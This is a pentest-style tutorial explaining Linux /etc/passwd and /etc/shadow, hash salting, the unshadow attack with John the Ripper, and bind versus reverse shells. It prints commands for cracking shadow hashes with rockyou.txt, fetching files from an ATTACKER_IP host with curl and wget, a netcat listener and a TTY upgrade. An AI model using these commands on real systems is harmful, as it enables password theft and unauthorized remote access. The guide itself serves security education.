# Unshadow Attack and Reverse Shells in Linux

## What You Will Learn

In this guide, you'll learn:

* What the `/etc/passwd` and `/etc/shadow` files are
* How password hashing and salting protect passwords
* What an **Unshadow Attack** is and how it works
* The difference between **Bind Shells** and **Reverse Shells**
* Common methods used to transfer files to a Linux machine
* How attackers upgrade a basic shell into an interactive TTY shell

> **Note:** These techniques are discussed for cybersecurity education, penetration testing, and defensive learning only. Always practice them only in environments you own or are authorized to test.

---

# Part 1: The Unshadow Attack

## What is an Unshadow Attack?

An **Unshadow Attack** is a Linux privilege escalation technique used when an attacker gains access to the system's password hash file (`/etc/shadow`).

Instead of trying to guess passwords directly on the target machine, the attacker:

1. Copies the password files.
2. Combines them using the `unshadow` tool.
3. Cracks the password hashes **offline** using password-cracking software.

If a weak password is discovered, it can then be used to log in or switch to another user.

---

# Understanding Linux Authentication Files

Linux stores user account information in **two separate files**.

## `/etc/passwd`

This file contains basic information about every user account.

It stores:

* Username
* User ID (UID)
* Group ID (GID)
* Home directory
* Default shell

Example:

```text
ubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash
```

Notice the **`x`** in the second field.

Older Linux systems stored passwords here, but modern systems replace them with **`x`** because the real password hashes are stored elsewhere.

### Why is `/etc/passwd` world-readable?

Many programs need user information to function properly.

Because of this, **every user can read `/etc/passwd`**.

Example:

```bash
cat /etc/passwd
```

This is completely normal.

---

## `/etc/shadow`

The `/etc/shadow` file stores the **actual password hashes**.

Unlike `/etc/passwd`, this file is highly sensitive.

Only:

* root
* members of the shadow group

can read it.

Example:

```text
ubuntu:$6$9rN8....$fhsd8f9shdf....
```

The long string is **not the password**.

It is the **hashed version** of the password.

---

# How Password Hashing Works

Modern operating systems **never store plain-text passwords**.

Instead:

```
Password
      ↓
Hash Function
      ↓
Hashed Password
```

For example:

```
Password:

abc123

↓

Hash:

$6$....$....
```

When the user logs in:

1. The entered password is hashed.
2. Linux compares the new hash with the stored hash.
3. If both hashes match, authentication succeeds.

The original password is never stored.

---

# What is Salting?

Imagine two users both choose the password:

```text
password123
```

Without a salt:

```
password123

↓

Same Hash

↓

Both users have identical hashes
```

An attacker could immediately tell they use the same password.

To prevent this, Linux adds a **random value called a salt** before hashing.

```
Salt + Password

↓

Hash
```

Example:

User 1

```
Salt = ABC

Password = password123

↓

Hash A
```

User 2

```
Salt = XYZ

Password = password123

↓

Hash B
```

Even though the passwords are identical, the hashes are completely different.

This makes password cracking much harder.

---

# Identifying the Hash Type

A password hash usually starts with something like:

```text
$6$
```

The number indicates which hashing algorithm is used.

Common examples:

| Prefix | Algorithm |
| ------ | --------- |
| `$1$`  | MD5       |
| `$5$`  | SHA-256   |
| `$6$`  | SHA-512   |

Example:

```text
$6$abc123$...
```

This means the password was hashed using **SHA-512 Crypt**.

---

# How an Unshadow Attack Works

The attack usually follows three steps.

---

## Step 1 – Obtain Both Files

The attacker somehow gains copies of:

```
/etc/passwd

/etc/shadow
```

This could happen because of:

* A system misconfiguration
* Exposed backups
* File permission issues
* Another vulnerability

---

## Step 2 – Merge the Files

The `unshadow` utility combines the two files into one.

Command:

```bash
unshadow passwd_file shadow_file > unshadowed_output
```

What it does:

Before:

```text
/etc/passwd

ubuntu:x:1000:1000...
```

```text
/etc/shadow

ubuntu:$6$hash...
```

After:

```text
ubuntu:$6$hash...
```

Now password-cracking tools can process the file.

---

## Step 3 – Crack the Password

The attacker uses **John the Ripper** together with a password wordlist.

Example:

```bash
john --format=Crypt --wordlist=rockyou.txt unshadowed_output
```

### What is `rockyou.txt`?

`rockyou.txt` is a famous password dictionary containing millions of real passwords leaked from previous data breaches.

Instead of trying every possible password, John simply checks each password in the list.

If a user selected a weak password like:

```
abc123
password
qwerty
welcome
```

John may discover it within seconds.

---

# What Happens After Cracking the Password?

Suppose John cracks the password:

```
ubuntu : abc123
```

If the attacker already has a shell on the machine, they may now authenticate as that user.

Example:

```bash
su ubuntu
```

Or provide the password when prompted by:

```bash
sudo
```

This can lead to privilege escalation if the compromised account has elevated permissions.

---

# Summary

An Unshadow Attack works like this:

```text
Gain access to

/etc/passwd
        +
/etc/shadow

        ↓

Combine them using unshadow

        ↓

Use John the Ripper

        ↓

Recover weak passwords

        ↓

Authenticate as another user
```

---

# Part 2: Reverse Shells

## What is a Reverse Shell?

A **reverse shell** is a technique that gives an attacker remote command-line access to a compromised system.

Instead of the attacker connecting **to** the victim, the victim connects **back** to the attacker.

This often works better because outbound network connections are commonly allowed through firewalls.

---

# Bind Shell vs Reverse Shell

## Bind Shell

In a bind shell:

1. The victim opens a listening port.
2. The attacker connects to that port.

```
Attacker
      │
      │
      ▼

Victim
Listening on Port 4444
```

### Problems

* Firewalls often block incoming connections.
* NAT makes inbound access difficult.
* The listening port may be detected by defenders.

---

## Reverse Shell

In a reverse shell:

1. The attacker starts a listener.
2. The victim initiates the connection.

```
Attacker
Listening

      ▲
      │
      │

Victim
Connects Out
```

### Advantages

* Works better through NAT.
* Outbound traffic is often permitted.
* Easier to establish in many environments.

---

# File Transfer Techniques

Before executing tools or scripts on the victim, attackers often need to copy files to the target.

A common approach is to temporarily host the file on the attacker's machine.

## Step 1 – Start a Simple HTTP Server

Example:

```bash
python3 -m http.server 8000
```

This shares the current directory over HTTP.

---

## Step 2 – Download the File

If available, the victim can retrieve the file using common command-line tools.

Using `curl`:

```bash
curl http://ATTACKER_IP:8000/file -o file
```

Using `wget`:

```bash
wget http://ATTACKER_IP:8000/file -O file
```

If those utilities are unavailable, other scripting languages such as Perl may also be used to fetch files.

---

# How Reverse Shells Work

A reverse shell performs these actions:

1. Creates a network connection to the attacker.
2. Launches a shell (`/bin/sh` or `/bin/bash`).
3. Redirects keyboard input and terminal output through the network connection.

The attacker then interacts with the remote system as if using a local terminal.

---

# Setting Up a Listener

Before the victim connects back, the attacker listens for incoming connections.

Example:

```bash
nc -lvnp 4444
```

Options:

* `-l` → Listen
* `-v` → Verbose output
* `-n` → Don't resolve hostnames
* `-p` → Specify the listening port

---

# Reverse Shell Payloads

Different programming languages can create reverse shells.

Common choices include:

* Bash
* Python
* Perl
* PHP
* Ruby

The chosen payload depends on which interpreters are installed on the target machine.

For example, Bash can use Linux's `/dev/tcp` feature, while Python creates a socket and launches a shell process.

---

# Why Upgrade the Shell?

Many reverse shells initially provide only a **basic shell**.

Problems include:

* No command history
* Broken text editors
* No tab completion
* Interactive programs may not work correctly
* Terminal behaves unpredictably

To make the session more usable, the shell is often upgraded to a full **TTY**.

---

# Upgrading to a TTY Shell

A common Python command is:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

This starts a proper interactive Bash shell.

Benefits include:

* Better command-line editing
* Interactive applications work correctly
* Improved terminal behavior
* Easier privilege escalation and system administration tasks

---

# Reverse Shell Workflow

```text
Attacker starts a listener

        ↓

Victim executes a reverse shell payload

        ↓

Victim connects back

        ↓

Attacker gains shell access

        ↓

Upgrade to a full TTY shell

        ↓

Perform post-exploitation tasks
```

---

# Key Takeaways

* `/etc/passwd` stores public user account information, while `/etc/shadow` stores password hashes.
* Passwords are protected using **hashing** and **salting** to make them difficult to recover.
* An **Unshadow Attack** combines the passwd and shadow files so password-cracking tools can process them offline.
* Weak passwords can often be recovered quickly using dictionary attacks with tools like John the Ripper.
* A **Bind Shell** waits for an incoming connection, whereas a **Reverse Shell** connects back to the attacker.
* Reverse shells are generally more reliable because they take advantage of outbound connections that are often allowed through firewalls.
* Simple reverse shells can be upgraded to a full **TTY shell** for a more stable and interactive command-line experience.
